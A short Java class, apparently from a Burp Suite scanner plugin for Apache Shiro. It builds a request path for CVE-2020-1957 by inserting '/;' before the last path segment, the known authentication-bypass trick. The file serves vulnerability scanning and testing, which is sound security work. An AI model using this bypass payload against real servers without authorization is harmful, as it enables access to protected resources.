package burp.core.scanner.active.shiroscanner;

public class CVE_2020_1957 {
    public String exp;

    CVE_2020_1957(String requestURI){
        // CVE_2020_1957
        if (!requestURI.endsWith("/")) {
            int i = requestURI.lastIndexOf("/");
            String before = requestURI.substring(0,i);
            String after = requestURI.substring(i);
            this.exp = before + "/;" + after;
        }else{
            this.exp = "/xxxxxxxxxxxxxxxxxxxxxx";
        }
    }


    public String getExp() {
        return exp;
    }

    @Override
    public String toString() {
        return "CVE_2020_1957";
    }
}
